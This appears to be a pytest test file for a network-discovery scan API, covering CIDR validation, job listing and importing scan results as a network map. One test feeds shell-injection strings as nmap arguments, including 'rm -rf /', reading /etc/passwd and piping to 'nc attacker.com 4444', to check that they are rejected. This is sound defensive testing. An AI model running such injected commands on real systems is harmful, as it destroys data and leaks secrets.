"""
Tests for the discovery scan API: POST /api/v1/discovery/scan and GET /api/v1/discovery/jobs
"""

import pytest

SCAN_URL = "/api/v1/discovery/scan"
JOBS_URL = "/api/v1/discovery/jobs"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_scan_job_with_results(db_session):
    """
    Create a ScanJob with two ScanResult rows (different IPs, same /24).
    Returns (job_id, [result_id_1, result_id_2]).
    """
    from app.core.time import utcnow_iso
    from app.db.models import ScanJob, ScanResult

    job = ScanJob(
        scan_types_json='["nmap"]',
        status="completed",
        triggered_by="api",
        source_type="manual",
        progress_phase="done",
        progress_message="",
        created_at=utcnow_iso(),
    )
    db_session.add(job)
    db_session.flush()

    now = utcnow_iso()
    r1 = ScanResult(
        scan_job_id=job.id,
        ip_address="192.168.10.11",
        state="new",
        merge_status="pending",
        created_at=now,
    )
    r2 = ScanResult(
        scan_job_id=job.id,
        ip_address="192.168.10.12",
        state="new",
        merge_status="pending",
        created_at=now,
    )
    db_session.add(r1)
    db_session.add(r2)
    db_session.flush()

    return job.id, [r1.id, r2.id]


# ---------------------------------------------------------------------------
# Create scan job
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_create_scan_valid_cidr(client, auth_headers):
    """Valid CIDR → 200/201/202 with a status field in the response."""
    payload = {"cidr": "192.168.1.0/24", "scan_types": ["nmap"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code in {200, 201, 202}
    # Response may be a single job or a list — normalise for assertion
    body = resp.json()
    if isinstance(body, list):
        assert len(body) >= 1
        assert "status" in body[0]
    else:
        assert "status" in body


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad_cidr",
    [
        "not-a-cidr",
        "192.168.1.300/24",
        "",
    ],
)
async def test_create_scan_invalid_cidr_returns_422(client, auth_headers, bad_cidr):
    """Malformed CIDR values should be rejected with 422."""
    payload = {"cidr": bad_cidr, "scan_types": ["nmap"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad_args",
    [
        "-sV; rm -rf /",
        "-sV && cat /etc/passwd",
        "-sV | nc attacker.com 4444",
        "-sV `id`",
        "-sV $(whoami)",
    ],
)
async def test_nmap_shell_metacharacter_rejected(client, auth_headers, bad_args):
    """nmap_arguments containing shell metacharacters should be rejected with 422."""
    payload = {
        "cidr": "10.0.0.0/24",
        "scan_types": ["nmap"],
        "nmap_arguments": bad_args,
    }
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_valid_nmap_arguments_accepted(client, auth_headers):
    """Safe nmap arguments like '-sV -T4' should be accepted."""
    payload = {
        "cidr": "10.0.0.0/24",
        "scan_types": ["nmap"],
        "nmap_arguments": "-sV -T4",
    }
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code in {200, 201, 202}


# ---------------------------------------------------------------------------
# List scan jobs
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_list_scan_jobs(client, auth_headers):
    """GET /discovery/jobs → 200 and returns a list."""
    resp = await client.get(JOBS_URL, headers=auth_headers)
    assert resp.status_code == 200
    assert isinstance(resp.json(), list)


# ---------------------------------------------------------------------------
# import-as-network
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_import_as_network_without_map_id_succeeds(client, auth_headers, db_session):
    """POST import-as-network with no map_id must return 200 with edges_created key."""
    job_id, result_ids = _make_scan_job_with_results(db_session)
    payload = {
        "items": [{"scan_result_id": rid, "overrides": {}} for rid in result_ids],
    }
    resp = await client.post(
        f"/api/v1/discovery/jobs/{job_id}/import-as-network",
        json=payload,
        headers=auth_headers,
    )
    assert resp.status_code == 200, f"Expected 200, got {resp.status_code}: {resp.text}"
    assert "edges_created" in resp.json()


@pytest.mark.asyncio
async def test_import_as_network_with_invalid_map_id_returns_404(client, auth_headers, db_session):
    """POST import-as-network with a non-existent map_id must return 404."""
    job_id, result_ids = _make_scan_job_with_results(db_session)
    payload = {
        "items": [{"scan_result_id": rid, "overrides": {}} for rid in result_ids],
        "map_id": 99999,
    }
    resp = await client.post(
        f"/api/v1/discovery/jobs/{job_id}/import-as-network",
        json=payload,
        headers=auth_headers,
    )
    assert resp.status_code == 404, f"Expected 404, got {resp.status_code}: {resp.text}"


@pytest.mark.asyncio
async def test_import_as_network_router_override_is_tree_root(client, auth_headers, db_session):
    """A node with role='router' override must be the source of all inferred edges."""
    import datetime

    from app.db.models import Hardware, HardwareConnection, ScanJob, ScanResult

    def _iso():
        return datetime.datetime.now(datetime.UTC).isoformat()

    job = ScanJob(
        target_cidr="172.16.0.0/24",
        scan_types_json='["arp"]',
        status="completed",
        created_at=_iso(),
    )
    db_session.add(job)
    db_session.flush()

    # Router at non-.1 IP (so IPAM alone wouldn't pick it)
    router_sr = ScanResult(
        scan_job_id=job.id,
        ip_address="172.16.0.50",
        state="new",
        merge_status="pending",
        created_at=_iso(),
    )
    endpoint_srs = [
        ScanResult(
            scan_job_id=job.id,
            ip_address=f"172.16.0.{i + 100}",
            state="new",
            merge_status="pending",
            created_at=_iso(),
        )
        for i in range(3)
    ]
    db_session.add(router_sr)
    for sr in endpoint_srs:
        db_session.add(sr)
    db_session.commit()

    payload = {
        "items": (
            [{"scan_result_id": router_sr.id, "overrides": {"role": "router"}}]
            + [{"scan_result_id": sr.id, "overrides": {}} for sr in endpoint_srs]
        )
    }
    resp = await client.post(
        f"/api/v1/discovery/jobs/{job.id}/import-as-network",
        json=payload,
        headers=auth_headers,
    )
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert data["edges_created"] == 3

    db_session.expire_all()
    router_hw = db_session.query(Hardware).filter_by(ip_address="172.16.0.50").one()
    assert router_hw.role == "router"

    connections = db_session.query(HardwareConnection).filter_by(source="discovery_inferred").all()
    assert all(c.source_hardware_id == router_hw.id for c in connections), (
        f"Expected all edges from router; got sources={[c.source_hardware_id for c in connections]}"
    )
